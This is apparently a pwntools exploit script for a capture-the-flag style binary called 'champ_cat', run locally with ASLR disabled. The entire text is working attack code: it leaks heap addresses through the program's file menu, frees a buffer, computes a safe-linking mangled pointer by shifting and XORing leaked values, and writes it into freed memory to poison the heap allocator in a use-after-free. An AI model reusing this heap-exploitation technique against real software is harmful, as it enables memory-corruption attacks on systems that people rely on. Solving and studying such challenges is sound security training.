from pwn import *

context(os="linux", arch="amd64")

victim = process("./champ_cat", aslr=False)

# Open file 0
victim.sendline(b'n')
victim.sendline(b'0')
victim.sendline(b'/etc/passwd')
victim.sendline(b'256')

# Open file 1
victim.sendline(b'n')
victim.sendline(b'1')
victim.sendline(b'/etc/passwd')
victim.sendline(b'256')

# Open file 2
victim.sendline(b'n')
victim.sendline(b'2')
victim.sendline(b'/etc/passwd')
victim.sendline(b'256')

#leak the addresses

victim.sendline(b'l')

#close files 1
victim.sendline(b'c')
victim.sendline(b'1')

#close file 2
victim.sendline(b'c')
victim.sendline(b'2')


victim.sendline(b'l')

# allocate the curse buffer

victim.sendline(b'm')
victim.sendline(b'256')
victim.sendline(b'HAHA CHAMP YOU ARE GOING DOWN')

#free the curse buffer
victim.sendline(b'd')

print(victim.recv(40000, timeout=8).decode('latin1'))

l_p = input("Enter the L: ")
p = input("Enter the p: ")
p = int(p, 16)
l_p = int(l_p, 16)
l_p = l_p >> 12
p_ = l_p ^ p

log.info(f" The mangled pointer is {hex(p_)} ")

victim.sendline(b'u')
victim.sendline(b'8')
victim.sendline(p64(p_))

victim.sendline(b'n')
victim.sendline(b'1')
victim.sendline(b'/etc/resolv.conf')
victim.sendline(b'256')

victim.sendline(b'f')

victim.sendline(b'l')

print(victim.recvall(timeout=5).decode('latin1'))
